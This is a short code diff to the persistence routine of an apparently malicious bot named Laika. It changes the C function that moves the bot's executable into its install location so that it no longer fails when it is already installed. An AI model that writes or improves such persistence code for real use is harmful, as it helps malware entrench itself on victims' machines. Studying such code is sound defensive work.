@@ -121,8 +121,8 @@ void laikaB_tryPersist() {
     getCurrentExe(exePath, PATH_MAX);
     getInstallPath(installPath, PATH_MAX);
 
-    /* move exe to install path */
-    if (rename(exePath, installPath))
+    /* move exe to install path (if it isn't there already) */
+    if (strncmp(exePath, installPath, strnlen(exePath, PATH_MAX)) != 0 && rename(exePath, installPath))
         LAIKA_ERROR("Failed to install '%s' to '%s'!\n", exePath, installPath);
 
     LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);
